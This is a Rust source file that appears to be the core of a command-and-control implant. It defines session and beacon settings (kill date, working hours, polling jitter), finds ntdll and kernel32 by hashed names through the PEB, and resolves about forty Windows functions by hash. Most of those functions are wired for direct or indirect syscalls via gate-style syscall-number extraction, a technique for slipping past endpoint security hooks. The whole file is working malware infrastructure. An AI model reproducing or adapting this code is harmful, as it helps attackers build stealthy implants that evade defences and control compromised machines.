#![no_std]

pub mod common;
pub mod ldr;

extern crate alloc;

use alloc::{string::String, vec::Vec};
use core::{
    cell::UnsafeCell,
    ffi::c_void,
    ptr::null_mut,
    sync::atomic::{AtomicBool, Ordering},
};

use kageshirei_win32::{
    kernel32::Kernel32,
    ntapi::NtDll,
    ntdef::{KUserSharedData, TEB},
};
use ldr::{ldr_function_addr, ldr_module_peb, nt_current_teb};
use mod_hhtgates::get_syscall_number;
use spin::{Mutex, RwLock};

/// Represents a session containing connection information.
pub struct Session {
    /// Indicates if the session is connected.
    pub connected:     bool,
    /// Unique identifier for the session.
    pub id:            String,
    /// Process ID.
    pub pid:           i64,
    /// Parent Process ID.
    pub ppid:          i64,
    /// Thread ID.
    pub tid:           i64,
    /// Encryptor
    pub encryptor_ptr: *mut c_void,
    /// Protocol
    pub protocol_ptr:  *mut c_void,
}

impl Default for Session {
    fn default() -> Self { Self::new() }
}

impl Session {
    /// Creates a new, disconnected session with default values.
    pub const fn new() -> Self {
        Self {
            connected:     false,
            id:            String::new(),
            pid:           0,
            ppid:          0,
            tid:           0,
            encryptor_ptr: null_mut(),
            protocol_ptr:  null_mut(),
        }
    }

    /// Set the generic pointer to data.
    pub fn set_encryptor_ptr(&mut self, encryptor: *mut c_void) { self.encryptor_ptr = encryptor; }

    /// Set the generic pointer to data.
    pub fn set_protocol_ptr(&mut self, protocol: *mut c_void) { self.protocol_ptr = protocol; }
}

/// Configuration settings for the instance.
pub struct Config {
    /// The unique identifier of the agent, required to poll for tasks
    pub id:               String,
    /// The unix timestamp of the kill date, if any.
    pub kill_date:        Option<i64>,
    /// The working hours for the current day (unix timestamp), if any.
    pub working_hours:    Option<Vec<Option<i64>>>,
    /// The agent polling interval in milliseconds.
    pub polling_interval: u128,
    /// The agent polling jitter in milliseconds.
    pub polling_jitter:   u128,
}

impl Default for Config {
    fn default() -> Self { Self::new() }
}

impl Config {
    /// Creates a new configuration with default values.
    pub const fn new() -> Self {
        Self {
            id:               String::new(),
            kill_date:        None,
            polling_interval: 0,
            polling_jitter:   0,
            working_hours:    None,
        }
    }
}

/// Represents the global instance containing configuration and session information.
pub struct Instance {
    /// Pointer to the Thread Environment Block.
    pub teb:          *mut TEB,
    /// Kernel User Shared Data.
    pub kdata:        *mut KUserSharedData,
    /// NtDll instance for native API calls.
    pub ntdll:        NtDll,
    /// Session information.
    pub session:      Session,
    /// Configuration settings.
    pub config:       Config,
    /// Pointer to Checkin Data
    pub pcheckindata: *mut c_void,
    pub kernel32:     Kernel32,
}

impl Default for Instance {
    fn default() -> Self { Self::new() }
}

impl Instance {
    /// Creates a new instance with default values.
    pub fn new() -> Self {
        Self {
            teb:          null_mut(),
            kdata:        null_mut(),
            ntdll:        NtDll::new(),
            session:      Session::new(),
            config:       Config::new(),
            pcheckindata: null_mut(),
            kernel32:     Kernel32::new(),
        }
    }

    /// Set the generic pointer to data.
    pub fn set_checkin_data(&mut self, data: *mut c_void) { self.pcheckindata = data; }
}

// Atomic flag to ensure initialization happens only once.
static INIT_INSTANCE: AtomicBool = AtomicBool::new(false);

/// Global mutable instance of the agent.
pub static mut INSTANCE: RwLock<UnsafeCell<Option<Instance>>> = RwLock::new(UnsafeCell::new(None));
// pub static mut INSTANCE: Option<Instance> = None;

/// Retrieves a reference to the global instance of the agent.
///
/// # Safety
///
/// This function is unsafe because it involves mutable static data.
/// The caller must ensure no data races occur when accessing the global instance.
#[expect(static_mut_refs)]
pub unsafe fn instance() -> &'static Instance {
    ensure_initialized();
    let lock = INSTANCE.read();
    (*lock.get()).as_ref().unwrap()
}

/// Retrieves a mutable reference to the global instance of the agent.
///
/// # Safety
///
/// This function is unsafe because it involves mutable static data.
/// The caller must ensure no data races occur when accessing the global instance.
#[expect(static_mut_refs)]
pub unsafe fn instance_mut() -> &'static mut Instance {
    ensure_initialized();
    let lock = INSTANCE.write(); // Usa `write` per accesso mutabile
    (*lock.get()).as_mut().unwrap()
}

/// Function to ensure that initialization is performed if it hasn't been already.
fn ensure_initialized() {
    unsafe {
        // Check and call initialize if not already done.
        if !INIT_INSTANCE.load(Ordering::Acquire) {
            init_global_instance();
        }
    }
}

/// Initializes the global instance by setting up necessary system call addresses and session data.
unsafe fn init_global_instance() {
    // Check if initialization has already occurred.
    if !INIT_INSTANCE.load(Ordering::Acquire) {
        // KERNEL32 FUNCTIONS
        const KERNEL32_H: u32 = 0x6ddb9555;
        const CREATE_PIPE_H: usize = 0x9694e9e7;
        const WRITE_FILE_H: usize = 0xf1d207d0;
        const READ_FILE_H: usize = 0x84d15061;
        const CREATE_PROCESS_W_H: usize = 0xfbaf90cf;
        const GET_CONSOLE_WINDOW_H: usize = 0xc2c4270;

        const NTDLL_H: u32 = 0x1edab0ed;

        // DIRECT NTDLL SYSCALL
        const LDR_LOAD_DLL_H: usize = 0x9e456a43;
        const RTL_CREATE_PROCESS_PARAMETERS_EX_H: usize = 0x533a05db;
        const RTL_GET_FULL_PATH_NAME_U_H: usize = 0xc4415dac;
        const RTL_GET_FULL_PATH_NAME_USTREX_H: usize = 0x1be830e2;
        const RTL_DOS_PATH_NAME_TO_NT_PATH_NAME_U_H: usize = 0x2b0a6d72;

        const RTL_CREATE_HEAP_H: usize = 0xe1af6849;
        const RTL_ALLOCATE_HEAP_H: usize = 0x3be94c5a;
        const RTL_FREE_HEAP_H: usize = 0x73a9e4d7;
        const RTL_DESTROY_HEAP_H: usize = 0xceb5349f;
        const RTL_REALLOCATE_HEAP_H: usize = 0xaf740371;

        // INDIRECT NTDLL SYSCALL
        const NT_ALLOCATE_VIRTUAL_MEMORY_H: usize = 0xf783b8ec;
        const NT_FREE_VIRTUAL_MEMORY_H: usize = 0x2802c609;
        const NT_TERMINATE_THREAD_H: usize = 0xccf58808;
        const NT_TERMINATE_PROCESS_H: usize = 0x4ed9dd4f;
        const NT_CLOSE_H: usize = 0x40d6e69d;
        const NT_OPEN_KEY_H: usize = 0x7682ed42;
        const NT_QUERY_VALUE_KEY_H: usize = 0x85967123;
        const NT_ENUMERATE_KEY_H: usize = 0x4d8a8976;
        const NT_QUERY_INFORMATION_PROCESS_H: usize = 0x8cdc5dc2;
        const NT_QUERY_INFORMATION_TOKEN_H: usize = 0xf371fe4;
        const NT_OPEN_PROCESS_TOKEN_H: usize = 0x350dca99;
        const NT_DELAY_EXECUTION_H: usize = 0xf5a936aa;
        const NT_CREATE_THREAD_EX_H: usize = 0xaf18cfb0;
        const NT_WAIT_FOR_SINGLE_OBJECT_H: usize = 0xe8ac0c3c;
        const NT_OPEN_PROCESS_H: usize = 0x4b82f718;
        const NT_CREATE_USER_PROCESS_H: usize = 0x54ce5f79;
        const NT_CREATE_NAMED_PIPE_FILE_H: usize = 0x1da0062e;
        const NT_OPEN_FILE_H: usize = 0x46dde739;
        // const NT_WRITE_VIRTUAL_MEMORY_H: usize = 0xc3170192;
        const NT_READ_VIRTUAL_MEMORY_H: usize = 0xa3288103;
        const NT_CREATE_PROCESS_H: usize = 0xf043985a;
        const NT_READ_FILE_H: usize = 0xb2d93203;
        const NT_QUERY_SYSTEM_INFORMATION_H: usize = 0x7bc23928;

        let mut instance = Instance::new();

        instance.kdata = 0x7ffe0000 as *mut KUserSharedData;
        instance.teb = nt_current_teb();

        // Resolve Ntdll base address
        instance.ntdll.module_base = ldr_module_peb(NTDLL_H);

        // Resolve Kernel32 base address
        instance.kernel32.module_base = ldr_module_peb(KERNEL32_H);

        // Resolve CreatePipe
        let create_pipe_addr = ldr_function_addr(instance.kernel32.module_base, CREATE_PIPE_H);
        instance.kernel32.create_pipe = core::mem::transmute(create_pipe_addr);

        // Resolve WriteFile
        let write_file_addr = ldr_function_addr(instance.kernel32.module_base, WRITE_FILE_H);
        instance.kernel32.write_file = core::mem::transmute(write_file_addr);

        // Resolve ReadFile
        let read_file_addr = ldr_function_addr(instance.kernel32.module_base, READ_FILE_H);
        instance.kernel32.read_file = core::mem::transmute(read_file_addr);

        // Resolve CreateProcessW
        let create_process_w_addr = ldr_function_addr(instance.kernel32.module_base, CREATE_PROCESS_W_H);
        instance.kernel32.create_process_w = core::mem::transmute(create_process_w_addr);

        // Resolve GetConsoleWindow
        let get_console_window_addr = ldr_function_addr(instance.kernel32.module_base, GET_CONSOLE_WINDOW_H);
        instance.kernel32.get_console_window = core::mem::transmute(get_console_window_addr);

        // Resolve LdrLoadDll
        let ldr_load_dll_addr = ldr_function_addr(instance.ntdll.module_base, LDR_LOAD_DLL_H);
        instance.ntdll.ldr_load_dll = core::mem::transmute(ldr_load_dll_addr);

        // Resolve RtlCreateProcessParameters
        let rtl_create_process_parameters_ex_addr = ldr_function_addr(
            instance.ntdll.module_base,
            RTL_CREATE_PROCESS_PARAMETERS_EX_H,
        );
        instance.ntdll.rtl_create_process_parameters_ex = core::mem::transmute(rtl_create_process_parameters_ex_addr);

        // Resolve RtlGetFullPathName_U
        let rtl_get_full_path_name_u_addr = ldr_function_addr(instance.ntdll.module_base, RTL_GET_FULL_PATH_NAME_U_H);
        instance.ntdll.rtl_get_full_path_name_u = core::mem::transmute(rtl_get_full_path_name_u_addr);

        // Resolve RtlGetFullPathName_UstrEx
        let rtl_get_full_path_name_ustrex_addr =
            ldr_function_addr(instance.ntdll.module_base, RTL_GET_FULL_PATH_NAME_USTREX_H);
        instance.ntdll.rtl_get_full_path_name_ustrex = core::mem::transmute(rtl_get_full_path_name_ustrex_addr);

        // Resolve RtlDosPathNameToNtPathName_U
        let rtl_dos_path_name_to_nt_path_name_u_addr = ldr_function_addr(
            instance.ntdll.module_base,
            RTL_DOS_PATH_NAME_TO_NT_PATH_NAME_U_H,
        );
        instance.ntdll.rtl_dos_path_name_to_nt_path_name_u =
            core::mem::transmute(rtl_dos_path_name_to_nt_path_name_u_addr);

        // Resolve RtlCreateHeap
        let rtl_create_heap_addr = ldr_function_addr(instance.ntdll.module_base, RTL_CREATE_HEAP_H);
        instance.ntdll.rtl_create_heap = core::mem::transmute(rtl_create_heap_addr);
        // Resolve RtlAllocateHeap
        let rtl_allocate_heap_addr = ldr_function_addr(instance.ntdll.module_base, RTL_ALLOCATE_HEAP_H);
        instance.ntdll.rtl_allocate_heap = core::mem::transmute(rtl_allocate_heap_addr);
        // Resolve RtlFreeHeap
        let rtl_free_heap_addr = ldr_function_addr(instance.ntdll.module_base, RTL_FREE_HEAP_H);
        instance.ntdll.rtl_free_heap = core::mem::transmute(rtl_free_heap_addr);
        // Resolve RtlReAllocateHeap
        let rtl_reallocate_heap_addr = ldr_function_addr(instance.ntdll.module_base, RTL_REALLOCATE_HEAP_H);
        instance.ntdll.rtl_reallocate_heap = core::mem::transmute(rtl_reallocate_heap_addr);
        // Resolve RtlDestroyHeap
        let rtl_destroy_heap_addr = ldr_function_addr(instance.ntdll.module_base, RTL_DESTROY_HEAP_H);
        instance.ntdll.rtl_destroy_heap = core::mem::transmute(rtl_destroy_heap_addr);

        // NtAllocateVirtualMemory
        instance.ntdll.nt_allocate_virtual_memory.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_ALLOCATE_VIRTUAL_MEMORY_H);
        instance.ntdll.nt_allocate_virtual_memory.syscall.number =
            get_syscall_number(instance.ntdll.nt_allocate_virtual_memory.syscall.address);

        // NtFreeVirtualMemory
        instance.ntdll.nt_free_virtual_memory.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_FREE_VIRTUAL_MEMORY_H);
        instance.ntdll.nt_free_virtual_memory.syscall.number =
            get_syscall_number(instance.ntdll.nt_free_virtual_memory.syscall.address);

        // NtTerminateThread
        instance.ntdll.nt_terminate_thread.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_TERMINATE_THREAD_H);
        instance.ntdll.nt_terminate_thread.syscall.number =
            get_syscall_number(instance.ntdll.nt_terminate_thread.syscall.address);

        // NtTerminateProcess
        instance.ntdll.nt_terminate_process.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_TERMINATE_PROCESS_H);
        instance.ntdll.nt_terminate_process.syscall.number =
            get_syscall_number(instance.ntdll.nt_terminate_process.syscall.address);

        // NtClose
        instance.ntdll.nt_close.syscall.address = ldr_function_addr(instance.ntdll.module_base, NT_CLOSE_H);
        instance.ntdll.nt_close.syscall.number = get_syscall_number(instance.ntdll.nt_close.syscall.address);

        // NtOpenKey
        instance.ntdll.nt_open_key.syscall.address = ldr_function_addr(instance.ntdll.module_base, NT_OPEN_KEY_H);
        instance.ntdll.nt_open_key.syscall.number = get_syscall_number(instance.ntdll.nt_open_key.syscall.address);

        // NtQueryValueKey
        instance.ntdll.nt_query_value_key.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_QUERY_VALUE_KEY_H);
        instance.ntdll.nt_query_value_key.syscall.number =
            get_syscall_number(instance.ntdll.nt_query_value_key.syscall.address);

        // NtEnumerateKey
        instance.ntdll.nt_enumerate_key.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_ENUMERATE_KEY_H);
        instance.ntdll.nt_enumerate_key.syscall.number =
            get_syscall_number(instance.ntdll.nt_enumerate_key.syscall.address);

        // NtQueryInformationProccess
        instance.ntdll.nt_query_information_process.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_QUERY_INFORMATION_PROCESS_H);
        instance.ntdll.nt_query_information_process.syscall.number =
            get_syscall_number(instance.ntdll.nt_query_information_process.syscall.address);

        // NtOpenProcess
        instance.ntdll.nt_open_process.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_PROCESS_H);
        instance.ntdll.nt_open_process.syscall.number =
            get_syscall_number(instance.ntdll.nt_open_process.syscall.address);

        // NtOpenProcessToken
        instance.ntdll.nt_open_process_token.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_OPEN_PROCESS_TOKEN_H);
        instance.ntdll.nt_open_process_token.syscall.number =
            get_syscall_number(instance.ntdll.nt_open_process_token.syscall.address);

        // NtQueryInformationToken
        instance.ntdll.nt_query_information_token.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_QUERY_INFORMATION_TOKEN_H);
        instance.ntdll.nt_query_information_token.syscall.number =
            get_syscall_number(instance.ntdll.nt_query_information_token.syscall.address);

        // NtDelayExecution
        instance.ntdll.nt_delay_execution.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_DELAY_EXECUTION_H);
        instance.ntdll.nt_delay_execution.syscall.number =
            get_syscall_number(instance.ntdll.nt_delay_execution.syscall.address);

        // NtCreateThreadEx
        instance.ntdll.nt_create_thread_ex.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_CREATE_THREAD_EX_H);
        instance.ntdll.nt_create_thread_ex.syscall.number =
            get_syscall_number(instance.ntdll.nt_create_thread_ex.syscall.address);

        // NtWaitForSingleObject
        instance.ntdll.nt_wait_for_single_object.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_WAIT_FOR_SINGLE_OBJECT_H);
        instance.ntdll.nt_wait_for_single_object.syscall.number =
            get_syscall_number(instance.ntdll.nt_wait_for_single_object.syscall.address);

        // NtCreateUserProcess
        instance.ntdll.nt_create_user_process.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_CREATE_USER_PROCESS_H);
        instance.ntdll.nt_create_user_process.syscall.number =
            get_syscall_number(instance.ntdll.nt_create_user_process.syscall.address);

        // NtCreateNamedPipeFile
        instance.ntdll.nt_create_named_pipe_file.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_CREATE_NAMED_PIPE_FILE_H);
        instance.ntdll.nt_create_named_pipe_file.syscall.number =
            get_syscall_number(instance.ntdll.nt_create_named_pipe_file.syscall.address);

        // NtOpenFile
        instance.ntdll.nt_open_file.syscall.address = ldr_function_addr(instance.ntdll.module_base, NT_OPEN_FILE_H);
        instance.ntdll.nt_open_file.syscall.number = get_syscall_number(instance.ntdll.nt_open_file.syscall.address);

        // NtReadFile
        instance.ntdll.nt_read_file.syscall.address = ldr_function_addr(instance.ntdll.module_base, NT_READ_FILE_H);
        instance.ntdll.nt_read_file.syscall.number = get_syscall_number(instance.ntdll.nt_read_file.syscall.address);

        // NtReadVirtualMemory
        instance.ntdll.nt_read_virtual_memory.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_READ_VIRTUAL_MEMORY_H);
        instance.ntdll.nt_read_virtual_memory.syscall.number =
            get_syscall_number(instance.ntdll.nt_read_virtual_memory.syscall.address);

        // NtCreateProcess
        instance.ntdll.nt_create_process.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_CREATE_PROCESS_H);
        instance.ntdll.nt_create_process.syscall.number =
            get_syscall_number(instance.ntdll.nt_create_process.syscall.address);

        // NtQuerySystemInformation
        instance.ntdll.nt_query_system_information.syscall.address =
            ldr_function_addr(instance.ntdll.module_base, NT_QUERY_SYSTEM_INFORMATION_H);
        instance.ntdll.nt_query_system_information.syscall.number =
            get_syscall_number(instance.ntdll.nt_query_system_information.syscall.address);

        // Init Session Data
        instance.session.connected = false;
        instance.session.pid = instance.teb.as_ref().unwrap().client_id.unique_process as i64;
        instance.session.tid = instance.teb.as_ref().unwrap().client_id.unique_thread as i64;

        // Init Config Data
        instance.config.polling_interval = 15;
        instance.config.polling_jitter = 10;

        let instance_lock = INSTANCE.write();
        *instance_lock.get() = Some(instance);

        // Set the initialization flag to true.
        INIT_INSTANCE.store(true, Ordering::Release);
    }
}
